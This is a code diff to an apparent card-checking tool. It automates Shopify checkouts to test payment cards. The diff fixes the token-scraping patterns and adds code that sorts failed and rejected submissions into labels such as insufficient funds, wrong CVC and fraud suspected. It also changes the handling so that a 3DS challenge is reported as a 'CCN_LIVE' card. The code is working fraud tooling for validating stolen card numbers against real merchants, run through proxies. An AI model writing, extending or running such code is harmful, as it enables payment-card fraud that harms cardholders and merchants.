@@ -547,14 +547,14 @@ def _extract_checkout_tokens_robust(checkout_text: str) -> dict:
     if out["source_token"] and len(out["source_token"]) < 10:
         out["source_token"] = None
 
-    # Queue token (often in JSON blob)
+    # Queue token (often in JSON blob); suffix &quot; (with semicolon) per script
     if not out["queue_token"]:
         out["queue_token"] = _capture_multi(
             text,
-            ('queueToken&quot;:&quot;', '&quot'),
+            ('queueToken&quot;:&quot;', '&quot;'),
             ('queueToken":"', '"'),
             ('"queueToken":"', '"'),
-        ) or capture(text, "queueToken&quot;:&quot;", "&quot")
+        ) or capture(text, "queueToken&quot;:&quot;", "&quot;")
     if not out["queue_token"]:
         m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', text)
         if m:
@@ -570,14 +570,14 @@ def _extract_checkout_tokens_robust(checkout_text: str) -> dict:
     if out["queue_token"] and isinstance(out["queue_token"], str):
         out["queue_token"] = out["queue_token"].strip() or None
 
-    # Stable ID
+    # Stable ID; suffix &quot; (with semicolon) per script
     if not out["stable_id"]:
         out["stable_id"] = _capture_multi(
             text,
-            ('stableId&quot;:&quot;', '&quot'),
+            ('stableId&quot;:&quot;', '&quot;'),
             ('stableId":"', '"'),
             ('"stableId":"', '"'),
-        ) or capture(text, "stableId&quot;:&quot;", "&quot")
+        ) or capture(text, "stableId&quot;:&quot;", "&quot;")
     if not out["stable_id"]:
         m = re.search(r'"stableId"\s*:\s*"([^"]+)"', text)
         if m:
@@ -1451,18 +1451,18 @@ async def autoshopify(url, card, session, proxy=None):
         try:
             paymentMethodIdentifier = _capture_multi(
                 checkout_text,
-                ('paymentMethodIdentifier&quot;:&quot;', '&quot'),
+                ('paymentMethodIdentifier&quot;:&quot;', '&quot;'),
                 ('paymentMethodIdentifier":"', '"'),
-            ) or capture(checkout_text, "paymentMethodIdentifier&quot;:&quot;", "&quot")
+            ) or capture(checkout_text, "paymentMethodIdentifier&quot;:&quot;", "&quot;")
         except Exception:
             paymentMethodIdentifier = None
         try:
             stable_id = _capture_multi(
                 checkout_text,
-                ('stableId&quot;:&quot;', '&quot'),
+                ('stableId&quot;:&quot;', '&quot;'),
                 ('stableId":"', '"'),
                 ('"stableId":"', '"'),
-            ) or capture(checkout_text, "stableId&quot;:&quot;", "&quot")
+            ) or capture(checkout_text, "stableId&quot;:&quot;", "&quot;")
             if not stable_id:
                 m = re.search(r'"stableId"\s*:\s*"([^"]+)"', checkout_text)
                 if m:
@@ -1472,10 +1472,10 @@ async def autoshopify(url, card, session, proxy=None):
         try:
             queue_token = _capture_multi(
                 checkout_text,
-                ('queueToken&quot;:&quot;', '&quot'),
+                ('queueToken&quot;:&quot;', '&quot;'),
                 ('queueToken":"', '"'),
                 ('"queueToken":"', '"'),
-            ) or capture(checkout_text, "queueToken&quot;:&quot;", "&quot")
+            ) or capture(checkout_text, "queueToken&quot;:&quot;", "&quot;")
             if not queue_token:
                 m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', checkout_text)
                 if m:
@@ -1638,7 +1638,7 @@ async def autoshopify(url, card, session, proxy=None):
                             if x_checkout_one_session_token or token or queue_token or stable_id:
                                 try:
                                     if not paymentMethodIdentifier:
-                                        paymentMethodIdentifier = _capture_multi(checkout_text, ('paymentMethodIdentifier&quot;:&quot;', '&quot'), ('paymentMethodIdentifier":"', '"')) or capture(checkout_text, "paymentMethodIdentifier&quot;:&quot;", "&quot")
+                                        paymentMethodIdentifier = _capture_multi(checkout_text, ('paymentMethodIdentifier&quot;:&quot;', '&quot;'), ('paymentMethodIdentifier":"', '"')) or capture(checkout_text, "paymentMethodIdentifier&quot;:&quot;", "&quot;")
                                     if not currencyCode:
                                         currencyCode = _capture_multi(checkout_text, ('currencyCode&quot;:&quot;', '&quot'), ('currencyCode":"', '"')) or capture(checkout_text, "currencyCode&quot;:&quot;", "&quot")
                                     if not countryCode:
@@ -1670,7 +1670,7 @@ async def autoshopify(url, card, session, proxy=None):
                         # Re-extract other fields from new page when we had none
                         try:
                             if not paymentMethodIdentifier:
-                                paymentMethodIdentifier = _capture_multi(checkout_text, ('paymentMethodIdentifier&quot;:&quot;', '&quot'), ('paymentMethodIdentifier":"', '"')) or capture(checkout_text, "paymentMethodIdentifier&quot;:&quot;", "&quot")
+                                paymentMethodIdentifier = _capture_multi(checkout_text, ('paymentMethodIdentifier&quot;:&quot;', '&quot;'), ('paymentMethodIdentifier":"', '"')) or capture(checkout_text, "paymentMethodIdentifier&quot;:&quot;", "&quot;")
                             if not currencyCode:
                                 currencyCode = _capture_multi(checkout_text, ('currencyCode&quot;:&quot;', '&quot'), ('currencyCode":"', '"')) or capture(checkout_text, "currencyCode&quot;:&quot;", "&quot")
                             if not countryCode:
@@ -2964,6 +2964,75 @@ async def autoshopify(url, card, session, proxy=None):
             return output
         
         sfc = jsun.get("data", {}).get("submitForCompletion") or {}
+        sfc_typename = sfc.get("__typename") or ""
+
+        # SubmitFailed: reason string (e.g. PAYMENT_FAILED, CAPTCHA_REQUIRED)
+        if sfc_typename == "SubmitFailed":
+            reason = (sfc.get("reason") or "SUBMIT_FAILED").strip()
+            resp = "CARD_DECLINED"
+            if "CAPTCHA" in reason.upper():
+                resp = "CAPTCHA_REQUIRED"
+            elif "PAYMENT" in reason.upper() or "DECLINED" in reason.upper():
+                resp = "CARD_DECLINED"
+            elif "NUMBER" in reason.upper() or "INVALID" in reason.upper():
+                resp = "INCORRECT_NUMBER"
+            elif "CVC" in reason.upper() or "CVV" in reason.upper():
+                resp = "INCORRECT_CVC"
+            elif "EXPIRED" in reason.upper():
+                resp = "CARD_EXPIRED"
+            elif "FRAUD" in reason.upper():
+                resp = "FRAUD_SUSPECTED"
+            elif "FUNDS" in reason.upper():
+                resp = "INSUFFICIENT_FUNDS"
+            elif "AUTHENTICATION" in reason.upper():
+                resp = "AUTHENTICATION_FAILED"
+            else:
+                resp = reason or "SUBMIT_FAILED"
+            output.update({
+                "Response": resp,
+                "Status": True,
+                "Gateway": gateway,
+                "Price": total,
+                "cc": card,
+            })
+            _log_output_to_terminal(output)
+            return output
+
+        # SubmitRejected: errors list with code/localizedMessage
+        if sfc_typename == "SubmitRejected":
+            errors = sfc.get("errors") or []
+            resp = "CARD_DECLINED"
+            if errors and isinstance(errors, list):
+                err = errors[0] if isinstance(errors[0], dict) else {}
+                code = (err.get("code") or err.get("nonLocalizedMessage") or err.get("localizedMessage") or "").strip()
+                if "CAPTCHA" in code.upper():
+                    resp = "CAPTCHA_REQUIRED"
+                elif "PAYMENT" in code.upper() or "DECLINED" in code.upper():
+                    resp = "CARD_DECLINED"
+                elif "NUMBER" in code.upper() or "INVALID" in code.upper():
+                    resp = "INCORRECT_NUMBER"
+                elif "CVC" in code.upper() or "CVV" in code.upper():
+                    resp = "INCORRECT_CVC"
+                elif "EXPIRED" in code.upper():
+                    resp = "CARD_EXPIRED"
+                elif "FRAUD" in code.upper():
+                    resp = "FRAUD_SUSPECTED"
+                elif "FUNDS" in code.upper():
+                    resp = "INSUFFICIENT_FUNDS"
+                elif "AUTHENTICATION" in code.upper():
+                    resp = "AUTHENTICATION_FAILED"
+                elif code:
+                    resp = code
+            output.update({
+                "Response": resp,
+                "Status": True,
+                "Gateway": gateway,
+                "Price": total,
+                "cc": card,
+            })
+            _log_output_to_terminal(output)
+            return output
+
         receipt = sfc.get("receipt") or {}
         receipt_id = receipt.get("id")
         if not receipt_id:
@@ -3214,9 +3283,10 @@ async def autoshopify(url, card, session, proxy=None):
                 "cc": card,
                 "ReceiptId": receipt_id
             })
-        elif "CompletePaymentChallenge" in res_json_str:
+        elif "CompletePaymentChallenge" in res_json_str or "ActionRequiredReceipt" in res_json_str:
+            # 3DS / challenge required -> card is live (CCN LIVE)
             output.update({
-                "Response": "3DS_REQUIRED",
+                "Response": "CCN_LIVE",
                 "Status": True,
                 "Gateway": gateway,
                 "Price": total,
